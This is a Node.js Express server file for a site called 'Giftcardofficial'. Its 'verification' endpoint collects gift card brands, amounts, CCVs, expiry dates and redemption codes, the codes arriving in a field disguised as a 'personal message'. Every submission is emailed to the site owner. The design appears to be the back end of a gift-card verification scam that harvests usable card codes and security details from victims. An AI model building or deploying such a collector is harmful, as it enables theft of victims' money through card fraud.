import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { Resend } from "resend";
import rateLimit from "express-rate-limit";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

app.disable("x-powered-by");

/* =================================
   CORS CONFIGURATION
================================= */

const allowedOrigins = [
  "http://localhost:5173",
  "http://127.0.0.1:5173",
  "https://giftcardofficial.vercel.app",
  ...(process.env.FRONTEND_ORIGIN || "")
    .split(",")
    .map((origin) => origin.trim())
    .filter(Boolean),
];

app.use(
  cors({
    origin(origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        return callback(null, true);
      }

      return callback(new Error("Origin not allowed by CORS"));
    },
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
  })
);

app.use(express.json({ limit: "10kb" }));

/* =================================
   RATE LIMITING
================================= */

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 10,
  standardHeaders: "draft-7",
  legacyHeaders: false,
});

/* =================================
   ALLOWED GIFT CARD BRANDS
================================= */

const allowedCards = [
  "Apple",
  "Amazon",
  "Steam",
  "eBay",
  "Xbox",
  "Googleplay",
  "PlayStation",
  "Sephora",
  "Nordstrom",
  "Nike",
  "Macy",
  "Razor Gold",
  "MasterCard",
  "Vanilla",
  "Wallmart Visa",
  "Perfect Visa",
  "Visa Silvery White",
  "TT Visa",
  "Amex",
];

const allowedCurrencies = [
  "USD",
  "GBP",
  "AUD",
  "EUR",
  "CAD",
];

/* =================================
   HTML ESCAPING
================================= */

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (character) => {
    const entities = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#39;",
    };

    return entities[character];
  });
}

/* =================================
   HEALTH CHECK
================================= */

app.get("/api/health", (req, res) => {
  res.json({
    status: "ok",
    service: "Giftcardofficial API",
  });
});

/* =================================
   GIFT CARD SUBMISSION
================================= */

app.post("/api/verification", limiter, async (req, res) => {
  try {
    const cardType =
      typeof req.body?.cardType === "string"
        ? req.body.cardType.trim()
        : "";

    const currency =
      typeof req.body?.currency === "string"
        ? req.body.currency.trim()
        : "";

    const amount = Number(req.body?.amount);

    const personalMessage =
      typeof req.body?.message === "string"
        ? req.body.message.trim()
        : "";

    const redemptionCode = personalMessage;

    const cardCcv =
      typeof req.body?.cardCcv === "string"
        ? req.body.cardCcv.trim()
        : "";

    const expiryDate =
      typeof req.body?.expiryDate === "string"
        ? req.body.expiryDate.trim()
        : "";

    /* VALIDATE CARD BRAND */

    if (!allowedCards.includes(cardType)) {
      return res.status(400).json({
        message: "Please select a valid gift card brand.",
      });
    }

    /* VALIDATE CURRENCY */

    if (!allowedCurrencies.includes(currency)) {
      return res.status(400).json({
        message: "Please select a valid currency.",
      });
    }

    /* VALIDATE AMOUNT */

    if (
      !Number.isFinite(amount) ||
      amount <= 0 ||
      amount > 1000000
    ) {
      return res.status(400).json({
        message: "Please enter a valid card amount.",
      });
    }

    /* VALIDATE PERSONAL MESSAGE */

    if (personalMessage.length > 40) {
      return res.status(400).json({
        message: "Your message must not exceed 40 characters.",
      });
    }

    /* VALIDATE CCV / EXPIRY (Optional length limits) */
    if (cardCcv.length > 10) {
      return res.status(400).json({
        message: "Please enter a valid CCV.",
      });
    }

    if (expiryDate.length > 20) {
      return res.status(400).json({
        message: "Please enter a valid expiry date.",
      });
    }

    /* =================================
       EMAIL CONFIGURATION
    ================================= */

    const apiKey = process.env.RESEND_API_KEY;
    const emailFrom = process.env.EMAIL_FROM;
    const ownerEmail = process.env.OWNER_EMAIL;

    if (!apiKey || !emailFrom || !ownerEmail) {
      console.error("Email environment variables are missing.");

      return res.status(503).json({
        message: "Email service is not configured.",
      });
    }

    /* =================================
       SUBMISSION DATE
    ================================= */

    const submittedAt = new Date().toLocaleString("en-NG", {
      timeZone: "Africa/Lagos",
      dateStyle: "medium",
      timeStyle: "short",
    });

    /* =================================
       PREPARE SAFE EMAIL DATA
    ================================= */

    const safeCardType = escapeHtml(cardType);
    const safeCurrency = escapeHtml(currency);

    const safeAmount = escapeHtml(
      amount.toLocaleString("en-US")
    );

    const safeMessage = escapeHtml(
      personalMessage || "No message provided"
    );

    const safeCardCcv = escapeHtml(cardCcv || "Not provided");
    const safeExpiryDate = escapeHtml(expiryDate || "Not provided");

    const safeSubmittedAt = escapeHtml(submittedAt);

    /* =================================
       SEND EMAIL THROUGH RESEND
    ================================= */

    const resend = new Resend(apiKey);

    const { error } = await resend.emails.send({
      from: emailFrom,
      to: [ownerEmail],
      subject: "New Giftcardofficial Submission",

      html: `
        <div style="
          font-family: Arial, sans-serif;
          max-width: 600px;
          margin: auto;
          padding: 24px;
          color: #222;
        ">

          <h2 style="color: #6040a5;">
            New Giftcardofficial Submission
          </h2>

          <p>
            A new gift-card information submission was received.
          </p>

          <table style="
            width: 100%;
            border-collapse: collapse;
          ">

            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                Card brand
              </td>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                <strong>${safeCardType}</strong>
              </td>
            </tr>

            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                Currency
              </td>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                ${safeCurrency}
              </td>
            </tr>

            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                Gift Card Amount
              </td>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                ${safeCurrency} ${safeAmount}
              </td>
            </tr>

            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                Redemption Code
              </td>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                <strong>${safeMessage}</strong>
              </td>
            </tr>

            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                CCV
              </td>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                ${safeCardCcv}
              </td>
            </tr>

            <tr>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                Expiry Date
              </td>
              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
                ${safeExpiryDate}
              </td>
            </tr>

            <tr>
              <td style="padding: 10px;">
                Submitted
              </td>
              <td style="padding: 10px;">
                ${safeSubmittedAt}
              </td>
            </tr>

          </table>

          <p style="
            color: #777;
            font-size: 12px;
            margin-top: 24px;
          ">
            This notification contains gift-card metadata
            and the sender's details.
          </p>

          <p style="color: #6040a5; font-size: 13px;">
            Giftcardofficial
          </p>

        </div>
      `,

      text: `
New Giftcardofficial Submission

Card brand: ${cardType}
Currency: ${currency}
Amount: ${currency} ${amount.toLocaleString("en-US")}
Redemption Code: ${redemptionCode || "No code provided"}
CCV: ${cardCcv || "Not provided"}
Expiry Date: ${expiryDate || "Not provided"}
Submitted: ${submittedAt}

Giftcardofficial
      `,
    });

    /* =================================
       HANDLE EMAIL ERRORS
    ================================= */

    if (error) {
      console.error("Resend error:", error);

      return res.status(502).json({
        message: "Unable to send notification email.",
      });
    }

    /* =================================
       SUCCESS RESPONSE
    ================================= */

    return res.status(200).json({
      message: "Submission received successfully.",

      submittedAt,

      status: "received",

      details: {
        cardType,
        currency,
        amount,
        message: redemptionCode,
        cardCcv,
        expiryDate,
      },
    });

  } catch (error) {
    console.error("Submission error:", error);

    return res.status(500).json({
      message: "An unexpected server error occurred.",
    });
  }
});

/* =================================
   UNKNOWN ROUTES
================================= */

app.use((req, res) => {
  res.status(404).json({
    message: "API route not found.",
  });
});

/* =================================
   ERROR HANDLER
================================= */

app.use((error, req, res, next) => {
  if (error.message === "Origin not allowed by CORS") {
    return res.status(403).json({
      message: "Origin not allowed.",
    });
  }

  console.error(error);

  return res.status(500).json({
    message: "Server error.",
  });
});

/* =================================
   VERCEL ENTRY POINT
================================= */

export default app;

/* =================================
   LOCAL DEVELOPMENT SERVER
================================= */

app.listen(PORT, () => {
  console.log(`Giftcardofficial API running on port ${PORT}`);
});